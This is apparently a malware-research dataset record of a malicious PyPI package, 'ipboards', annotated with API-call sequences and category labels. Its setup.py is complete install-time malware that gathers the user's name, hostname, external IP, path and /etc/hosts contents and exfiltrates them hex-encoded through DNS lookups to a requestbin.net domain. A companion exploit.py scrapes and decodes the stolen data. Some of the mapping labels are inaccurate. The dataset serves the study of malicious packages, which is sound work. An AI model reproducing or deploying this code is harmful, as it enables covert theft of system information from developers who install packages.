[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ipboards-9999.0.2/ipboards-9999.0.2/setup.py",
    "code_snippet": "import dns.resolver\nimport getpass\nimport requests\nimport uuid\nfrom binascii import hexlify\nimport socket\nimport os\nimport time\n\ndnss = \".b0a0374cd1cb4305002e.d.requestbin.net\"\npackagename = \"ipboard\"\nuuidOne = str(uuid.uuid1())[0:8]\ndnss = '.' + uuidOne + dnss\nip = requests.get('http://ip.42.pl/raw').text\n\n#username,hostname,external_IP,time,path,package_name\nf = open(\"/etc/hosts\", \"r\")\nhostFile = f.read()\nusername = getpass.getuser()\nhostname = socket.gethostname()\nnow = int(time.time())\npath = os.path.dirname(os.path.abspath(__file__))\npayload = ip + ';' + username + ';' + hostname + ';' + str(now) + ';' + path + ';' + packagename + ';' + hostFile\ntry:\n    payload = hexlify(bytes(payload, encoding='utf8'))\nexcept:\n    payload = hexlify(bytes(payload))\n\nchunks = [payload[i:i+50] for i in range(0, len(payload), 50)]\n\nfor pd in chunks:\n    dns.resolver.query(pd.decode(\"utf-8\") + dnss, 'A')",
    "pattern_analysis": {
      "api_sequence": [
        "uuid.uuid1",
        "requests.get",
        "open",
        "builtins.open.read",
        "getpass.getuser",
        "socket.gethostname",
        "time.time",
        "os.path.abspath",
        "os.path.dirname",
        "binascii.hexlify",
        "binascii.hexlify",
        "bytes",
        "dns.resolver.query",
        "builtins.bytes",
        "builtins.bytes",
        "builtins.int"
      ],
      "api_sequence_with_args": [
        "uuid.uuid1()",
        "requests.get('http://ip.42.pl/raw')",
        "open('/etc/hosts', 'r')",
        "f.read()",
        "getpass.getuser()",
        "socket.gethostname()",
        "time.time()",
        "os.path.abspath(__file__)",
        "os.path.dirname(os.path.abspath(__file__))",
        "binascii.hexlify(bytes(payload, encoding='utf8'))",
        "binascii.hexlify(bytes(payload))",
        "bytes(payload, encoding='utf8')",
        "dns.resolver.query(pd.decode('utf-8') + dnss, 'A')",
        "bytes(payload, encoding='utf8')",
        "bytes(payload)",
        "int(time.time())"
      ],
      "mapped_sequence": [
        {
          "api_name": "uuid.uuid1",
          "id": "create_uuid",
          "description": "Creates a UUID based on the host ID and current time",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "builtins.open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "time.time",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.dirname",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "binascii.hexlify",
          "id": "convert_bytes_to_hex",
          "description": "Converts bytes to hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "binascii.hexlify",
          "id": "convert_bytes_to_hex",
          "description": "Converts bytes to hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes",
          "id": "create_bytes_encoded",
          "description": "Creates bytes object from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "dns.resolver.query",
          "id": "create_dns_resolver",
          "description": "Creates DNS resolver object with custom configuration",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "bytes",
          "id": "create_bytes_encoded",
          "description": "Creates bytes object from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes",
          "id": "create_bytes_encoded",
          "description": "Creates bytes object from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "int",
          "id": "convert_int_to_bytes",
          "description": "Converts integer to bytes with specified length and byte order",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        }
      ],
      "contextual_code": "import dns.resolver\nimport getpass\nimport requests\nimport uuid\nfrom binascii import hexlify\nimport socket\nimport os\nimport time\n\ndnss = \".b0a0374cd1cb4305002e.d.requestbin.net\"\npackagename = \"ipboard\"\nuuidOne = str(uuid.uuid1())[0:8]\ndnss = '.' + uuidOne + dnss\nip = requests.get('http://ip.42.pl/raw').text\n\n#username,hostname,external_IP,time,path,package_name\nf = open(\"/etc/hosts\", \"r\")\nhostFile = f.read()\nusername = getpass.getuser()\nhostname = socket.gethostname()\nnow = int(time.time())\npath = os.path.dirname(os.path.abspath(__file__))\npayload = ip + ';' + username + ';' + hostname + ';' + str(now) + ';' + path + ';' + packagename + ';' + hostFile\ntry:\n    payload = hexlify(bytes(payload, encoding='utf8'))\nexcept:\n    payload = hexlify(bytes(payload))\n\nchunks = [payload[i:i+50] for i in range(0, len(payload), 50)]\n\nfor pd in chunks:\n    dns.resolver.query(pd.decode(\"utf-8\") + dnss, 'A')"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ipboards-9999.0.2/ipboards-9999.0.2/exploit.py",
    "code_snippet": "from selenium import webdriver\nfrom time import sleep\nimport re\n\nchromedriver = '/home/geeky-cat/Desktop/HackTheBox/depConfusion/pythonlib/chromedriver'\n \noptions = webdriver.ChromeOptions()\noptions.add_argument('headless')\noptions.add_argument('window-size=1200x600')\n \nbrowser = webdriver.Chrome(executable_path=chromedriver, chrome_options=options)\n \nbrowser.get('https://requestbin.net/dns?master=b0a0374cd1cb4305002e')\nsleep(5)\nspanelement=browser.find_element_by_class_name('list-group').text\ndata=re.sub(r'TIME.*', '', spanelement)\ndata=re.sub(r'FROM.*', '', data)\ndata=re.sub(r'DATA.*', '', data)\ndata=re.sub(r'\\..*', '', data)\ndata=re.sub(r'____FINISHED____.*', '', data)\ndata=re.sub(r'\\n', '', data)\ndecoded=bytearray.fromhex(data).decode() \nprint(decoded)",
    "pattern_analysis": {
      "api_sequence": [
        "selenium.webdriver.ChromeOptions",
        "selenium.webdriver.ChromeOptions.add_argument",
        "selenium.webdriver.Chrome",
        "selenium.webdriver.Chrome.get",
        "time.sleep",
        "selenium.webdriver.Chrome.find_element_by_class_name",
        "re.sub",
        "re.sub",
        "re.sub",
        "re.sub",
        "re.sub",
        "re.sub",
        "bytearray.fromhex",
        "bytearray.decode",
        "print"
      ],
      "api_sequence_with_args": [
        "selenium.webdriver.ChromeOptions()",
        "selenium.webdriver.ChromeOptions.add_argument('headless')",
        "selenium.webdriver.ChromeOptions.add_argument('window-size=1200x600')",
        "selenium.webdriver.Chrome(executable_path=chromedriver, chrome_options=options)",
        "selenium.webdriver.Chrome.get('https://requestbin.net/dns?master=b0a0374cd1cb4305002e')",
        "time.sleep(5)",
        "selenium.webdriver.Chrome.find_element_by_class_name('list-group').text",
        "re.sub(r'TIME.*', '', spanelement)",
        "re.sub(r'FROM.*', '', data)",
        "re.sub(r'DATA.*', '', data)",
        "re.sub(r'\\..*', '', data)",
        "re.sub(r'____FINISHED____.*', '', data)",
        "re.sub(r'\\n', '', data)",
        "bytearray.fromhex(data)",
        "bytearray.decode()",
        "print(decoded)"
      ],
      "mapped_sequence": [
        {
          "api_name": "selenium.webdriver.ChromeOptions",
          "id": "init_browser_class",
          "description": "Instantiates Browser class with configuration",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "instance_creation"
        },
        {
          "api_name": "selenium.webdriver.ChromeOptions.add_argument",
          "id": "init_browser_class",
          "description": "Instantiates Browser class with configuration",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "instance_creation"
        },
        {
          "api_name": "selenium.webdriver.Chrome",
          "id": "init_chromium_class",
          "description": "Instantiates Chromium class with configuration",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "instance_creation"
        },
        {
          "api_name": "selenium.webdriver.Chrome.get",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "selenium.webdriver.Chrome.find_element_by_class_name",
          "id": "get_window_title",
          "description": "Retrieves window title text",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_finding"
        },
        {
          "api_name": "re.sub",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "bytearray.fromhex",
          "id": "create_bytes_hex",
          "description": "Creates bytes object from hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytearray.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "print",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        }
      ],
      "contextual_code": "from selenium import webdriver\nfrom time import sleep\nimport re\n\nchromedriver = '/home/geeky-cat/Desktop/HackTheBox/depConfusion/pythonlib/chromedriver'\n\noptions = webdriver.ChromeOptions()\noptions.add_argument('headless')\noptions.add_argument('window-size=1200x600')\n\nbrowser = webdriver.Chrome(executable_path=chromedriver, chrome_options=options)\n\nbrowser.get('https://requestbin.net/dns?master=b0a0374cd1cb4305002e')\nsleep(5)\nspanelement = browser.find_element_by_class_name('list-group').text\ndata = re.sub(r'TIME.*', '', spanelement)\ndata = re.sub(r'FROM.*', '', data)\ndata = re.sub(r'DATA.*', '', data)\ndata = re.sub(r'\\..*', '', data)\ndata = re.sub(r'____FINISHED____.*', '', data)\ndata = re.sub(r'\\n', '', data)\ndecoded = bytearray.fromhex(data).decode()\nprint(decoded)"
    }
  }
]